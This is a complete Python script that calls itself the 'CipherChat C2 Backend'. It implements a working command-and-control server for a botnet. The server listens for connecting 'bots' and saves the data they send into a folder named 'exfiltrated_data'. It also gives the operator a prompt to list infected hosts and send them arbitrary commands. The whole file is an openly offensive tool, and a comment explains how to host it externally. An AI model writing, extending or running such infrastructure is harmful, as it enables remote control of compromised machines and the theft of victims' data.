#!/usr/bin/env python3
import socket
import threading
import json
import os
from datetime import datetime

# C2 server settings
HOST = "127.0.0.1"  # Change to your server IP if hosting externally
PORT = 4444
DATA_DIR = "exfiltrated_data"

# Ensure data directory exists
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# Store connected bots (bot_id -> socket)
bots = {}
bots_lock = threading.Lock()

def handle_bot(bot_socket, bot_address):
    """Handle communication with a single bot."""
    print(f"[*] New bot connected from {bot_address[0]}:{bot_address[1]}")
    
    bot_id = f"bot_{bot_address[0]}_{bot_address[1]}"
    with bots_lock:
        bots[bot_id] = bot_socket
    
    try:
        while True:
            # Receive data from the bot (e.g., exfiltrated info)
            data = bot_socket.recv(4096).decode('utf-8', errors='ignore')
            if not data:
                break
            
            # Parse JSON data from bot
            try:
                bot_data = json.loads(data)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{DATA_DIR}/{bot_id}_{timestamp}.json"
                with open(filename, 'w') as f:
                    json.dump(bot_data, f, indent=2)
                print(f"[*] Received exfiltrated data from {bot_id}: Saved to {filename}")
            except json.JSONDecodeError:
                print(f"[!] Invalid data from {bot_id}: {data}")
    except Exception as e:
        print(f"[!] Error with bot {bot_id}: {e}")
    finally:
        with bots_lock:
            if bot_id in bots:
                del bots[bot_id]
        bot_socket.close()
        print(f"[*] Bot {bot_id} disconnected")

def start_server():
    """Start the C2 backend server."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"[*] C2 backend listening on {HOST}:{PORT}")
    except Exception as e:
        print(f"[!] Failed to start server: {e}")
        return

    while True:
        try:
            bot_socket, bot_address = server_socket.accept()
            bot_thread = threading.Thread(target=handle_bot, args=(bot_socket, bot_address))
            bot_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
            server_socket.close()
            break

def send_command(bot_id, command):
    """Send a command to a specific bot."""
    with bots_lock:
        if bot_id in bots:
            try:
                bots[bot_id].send(command.encode('utf-8'))
                print(f"[*] Sent command to {bot_id}: {command}")
            except Exception as e:
                print(f"[!] Failed to send command to {bot_id}: {e}")
        else:
            print(f"[!] Bot {bot_id} not found")

if __name__ == "__main__":
    print("=== CipherChat C2 Backend ===")
    print("A command-and-control backend by Yuno\n")

    # Start server in a separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    # Command loop for manual interaction
    while True:
        try:
            cmd_input = input("C2> ").strip()
            if cmd_input.lower() == "exit":
                print("[*] Exiting C2 backend...")
                break
            if cmd_input.lower() == "bots":
                with bots_lock:
                    if not bots:
                        print("[*] No bots connected")
                    else:
                        print("[*] Connected bots:")
                        for bot_id in bots.keys():
                            print(f"    {bot_id}")
                continue
            if cmd_input.lower().startswith("send "):
                parts = cmd_input.split(" ", 2)
                if len(parts) == 3:
                    bot_id, command = parts[1], parts[2]
                    send_command(bot_id, command)
                else:
                    print("[!] Usage: send <bot_id> <command>")
            else:
                print("[!] Unknown command. Use 'bots', 'send <bot_id> <command>', or 'exit'")
        except KeyboardInterrupt:
            print("\n[*] Exiting C2 backend...")
            break